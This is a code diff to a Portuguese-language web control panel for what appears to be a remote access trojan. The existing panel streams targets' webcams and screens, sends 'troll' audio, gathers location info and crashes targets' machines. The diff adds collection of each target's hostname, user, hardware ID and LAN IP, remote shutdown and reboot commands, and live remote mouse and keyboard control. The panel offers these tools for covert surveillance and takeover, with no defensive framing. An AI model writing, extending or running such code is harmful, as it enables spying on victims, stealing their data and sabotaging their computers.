@@ -11,6 +11,7 @@
 -->
 
 <!-- Sukita is the main of DL – v2.4 -->
+<!-- Sukita is the main of DL – v2.4 -->
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -248,6 +249,16 @@
         <div class="menu-btn" data-action="troll-audio"><i class="fa-solid fa-paper-plane"></i><span>Enviar áudio</span></div>
         <div class="menu-btn info-btn" data-action="info"><i class="fa-solid fa-map-location-dot"></i><span>Pegar infos</span></div>
         <div class="menu-btn danger-btn" data-action="crash"><i class="fa-solid fa-bug"></i><span>Crashar tudo kkkkk</span></div>
+<div class="menu-btn info-btn" data-action="hwinfo">
+  <i class="fa-solid fa-microchip"></i><span>HW Info</span>
+</div>
+<div class="menu-btn danger-btn" data-action="shutdown">
+  <i class="fa-solid fa-power-off"></i><span>Desligar</span>
+</div>
+<div class="menu-btn danger-btn" data-action="reboot">
+  <i class="fa-solid fa-rotate"></i><span>Reiniciar</span>
+</div>
+
       </div>
     </div>
   </div>
@@ -293,6 +304,26 @@
       </div>
     </div>
   </div>
+
+<!-- Modal HW Info -->
+<div class="modal fade" id="hwModal" tabindex="-1">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content bg-dark text-white border-0">
+      <div class="modal-header border-0">
+        <h5 class="modal-title">
+          <i class="fa-solid fa-microchip me-2"></i>Hardware
+        </h5>
+        <button class="btn-close btn-close-white"
+                data-bs-dismiss="modal"></button>
+      </div>
+      <div class="modal-body">
+        <pre id="hwPre" class="small mb-0"></pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+
 
   <!-- Modal Crash -->
   <div class="modal fade" id="crashModal" tabindex="-1">
@@ -480,6 +511,25 @@
   });
   socket.on('frame',d=>$('img-'+d.id)?.setAttribute('src',d.data));
   socket.on('screen-frame',d=>$('screen-img-'+d.id)?.setAttribute('src',d.data));
+/* ── recebe HW info do servidor ── */
+socket.on('hwinfo-update', ({uuid, info})=>{
+  cache[uuid].hwinfo = info;          // salva no cache
+  if (uuid !== currentUUID) return;   // só mostra se for o alvo atual
+
+  /* formata & insere no <pre> */
+  $('hwPre').textContent = `
+Host:   ${info.hostname}
+User:   ${info.user}
+HWID:   ${info.hwid}
+
+OS:     ${info.os}
+CPU:    ${info.cpu}  (${info.cpu_load}%)
+RAM:    ${info.ram_free}/${info.ram_tot}  GB
+Disk:   ${info.disk_free}/${info.disk_tot}  GB
+LAN IP: ${info.ip_local}`.trim();
+
+  bootstrap.Modal.getOrCreateInstance('#hwModal').show();
+});
 
   /* ===== Clique no cliente ===== */
   let currentUUID=null;
@@ -489,6 +539,8 @@
     $('menuTitle').textContent=`Menu de: ${cache[currentUUID].ip}`;
     openOverlay('actionMenu');
   });
+
+
 
   /* ===== Menu de ações ===== */
   $('actionMenu').addEventListener('click',e=>{
@@ -506,6 +558,21 @@
       case 'troll-audio': refreshAudioList(); bootstrap.Modal.getOrCreateInstance('#selectAudioModal').show(); break;
       case 'info':        showInfo(); break;
       case 'crash':       bootstrap.Modal.getOrCreateInstance('#crashModal').show(); break;
+      case 'hwinfo':
+  socket.emit('request-hwinfo', currentUUID);
+  toast('HW info requisitada');
+  break;
+
+case 'shutdown':
+  socket.emit('shutdown', currentUUID);
+  toast('Shutdown enviado', 'danger');
+  break;
+
+case 'reboot':
+  socket.emit('reboot', currentUUID);
+  toast('Reboot enviado', 'danger');
+  break;
+
     }
   });
 
@@ -523,12 +590,73 @@
         <button class="btn-glass btn-full"><i class="fa-solid fa-expand"></i></button>
         <button class="btn-glass btn-min"><i class="fa-solid fa-minus"></i></button>
         <button class="btn-glass btn-stop"><i class="fa-solid fa-xmark"></i></button>
+        <button class="btn-glass btn-ctl" title="Controle">
+  <i class="fa-solid fa-mouse-pointer"></i>
+</button>
+
       </div>`;
+      // botão Controle: entra em modo remoto
+const ctlBtn = card.querySelector('.btn-ctl');
+ctlBtn.onclick = () => startRemoteControl(card, uuid);
+
+function startRemoteControl(card, uuid){
+  const img = card.querySelector('img');
+  // pede foco em tela cheia para capturar teclado
+  openFull(card);
+
+  /* ---- mouse ---- */
+  img.style.cursor='crosshair';
+  img.onmousemove = e=>{
+    const r = img.getBoundingClientRect();
+    const xp = (e.clientX - r.left) / r.width;   // 0‑1
+    const yp = (e.clientY - r.top ) / r.height;  // 0‑1
+    socket.emit('mouse-event', {uuid, ev:{type:'move', xp, yp}});
+  };
+  img.onclick = e=>{
+    socket.emit('mouse-event', {uuid, ev:{type:'click', btn:'left'}});
+  };
+  img.oncontextmenu = e=>{
+    e.preventDefault();
+    socket.emit('mouse-event', {uuid, ev:{type:'click', btn:'right'}});
+  };
+  img.onwheel = e=>{
+    socket.emit('mouse-event', {uuid, ev:{type:'scroll', dy:e.deltaY>0? -1:1}});
+  };
+
+  /* ---- teclado ---- */
+  document.addEventListener('keydown',  keyEvt);
+  document.addEventListener('keyup',    keyEvt);
+
+  function keyEvt(e){
+    // tecla simples (ignora Ctrl + ... por segurança)
+    if (e.ctrlKey || e.metaKey) return;
+    const action = e.type === 'keydown' ? 'press' : 'release';
+    socket.emit('key-event', {uuid, ev:{action, key:e.key}});
+    e.preventDefault();
+  }
+
+  /* ---- sair do modo ---- */
+  function cleanup(){
+    img.onmousemove = img.onclick = img.oncontextmenu = img.onwheel = null;
+    document.removeEventListener('keydown', keyEvt);
+    document.removeEventListener('keyup',   keyEvt);
+    img.style.cursor='default';
+  }
+  // sai quando fecha full‑screen
+  document.addEventListener('fullscreenchange', () => {
+    if (!document.fullscreenElement) cleanup();
+  }, { once:true });
+}
+
+
     card.querySelector('.btn-full').onclick=()=>openFull(card);
     card.querySelector('.btn-min').onclick=()=>{ if(document.fullscreenElement===card) document.exitFullscreen(); };
     card.querySelector('.btn-stop').onclick=()=>{ socket.emit(kind==='cam'?'stop-stream':'stop-screen',uuid); card.remove(); };
     $('viewer').appendChild(card);
   };
+
+  
+  
   const startStream = kind=>{
     if(kind==='cam'   && activeCam[currentUUID])     {toast('Câmera já ativa','secondary');return;}
     if(kind==='screen'&& activeScreen[currentUUID])  {toast('Tela já ativa','secondary');return;}
@@ -614,6 +742,8 @@
     bootstrap.Modal.getInstance('#recordModal').hide();
   };
 
+  
+
   /* ===== Upload áudio local ===== */
   $('audioFile').onchange=e=>{
     const f=e.target.files[0]; if(!f) return;
@@ -624,6 +754,10 @@
 
   /* ===== Link do modal de updates ===== */
   $('updatesLinkBtn').onclick=()=>window.open('https://saporraesukita.netlify.app','_blank');
+
+
+
+  
   </script>
 </body>
 </html>
